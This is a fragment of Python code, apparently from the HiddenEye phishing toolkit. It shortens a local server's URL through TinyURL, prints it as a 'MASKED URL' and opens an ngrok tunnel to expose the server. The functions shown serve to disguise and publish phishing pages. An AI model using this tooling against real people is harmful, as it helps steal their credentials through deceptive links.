...
def start_localhost(port):
    ...
    run_command("clear")
    baseurl = "http://tinyurl.com/api-create.php?url=http://127.0.0.1:%s/"%(port)
    res = rqs.get(baseurl)
    mu = res.text
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    ...
    print(localization.lang_start_localhost["localhost_url"] +
          "{0}:{1}\n".format(host, port))
    print(f"\n\033[91m[\033[36m*\033[91m]\033[36m MASKED URL: \033[1;32m {mu}")
...
def start_ngrok(port):
    ...
    ngrok.connect(port=port,name='HiddenEye Connection')#TODO done
